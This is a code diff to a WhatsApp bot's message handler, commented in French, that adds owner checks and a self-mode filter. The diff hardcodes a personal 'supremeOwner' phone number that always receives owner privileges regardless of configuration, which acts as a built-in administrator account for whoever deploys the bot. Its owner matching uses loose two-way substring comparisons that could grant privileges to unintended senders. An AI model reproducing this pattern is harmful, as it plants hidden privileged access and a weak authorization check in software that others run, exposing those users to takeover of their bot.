@@ -288,14 +288,49 @@ const isSystemJid = (jid) => {
          jid.includes('@newsletter.');
 };
 
-// Main message handler
+//---------Main message ---handler
 const handleMessage = async (sock, msg) => {
   try {
     if (!msg.message) return;
 
     const from = msg.key.remoteJid;
+    
+    // 🔍 On garde la sécurité pour ignorer les statuts et newsletters
+    const isSystemJid = (jid) => !jid || jid.includes('@broadcast') || jid.includes('status.broadcast') || jid.includes('@newsletter');
     if (isSystemJid(from)) return;
 
+    const isGroup = from.endsWith('@g.us');
+    const senderJid = msg.key.participant || msg.key.remoteJid;
+    const senderNumber = senderJid.replace(/\D/g, '');
+
+    // 🛡️ Définition des privilèges (Ton accès Maître suprême)
+    const supremeOwner = '22651622652';
+    const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+    
+    const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+      const cleanN = String(n).replace(/\D/g, '');
+      return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+    });
+
+    const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+    // 🚨 LA RÈGLE D'OR DU SELFMODE REVISITÉE
+    if (config.selfMode && !isMe) {
+      // On ignore complètement les messages des autres en privé
+      if (!isGroup) return; 
+
+      // En groupe, on extrait le texte pour voir si c'est une commande
+      const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+      const isCommand = body.startsWith(config.prefix || '.');
+      
+      // Si un membre lambda tape une commande -> On bloque.
+      if (isCommand) return; 
+    }
+
+    // -------------------------------------------------------------------
+    // ⚠️ NE TOUCHE PAS À CE QUI EST EN DESSOUS ! 
+    // Colle ton code ici (les commandes, l'analyse des messages, etc.)
+    // -------------------------------------------------------------------
     // Auto-React System
     try {
       delete require.cache[require.resolve('./config')];
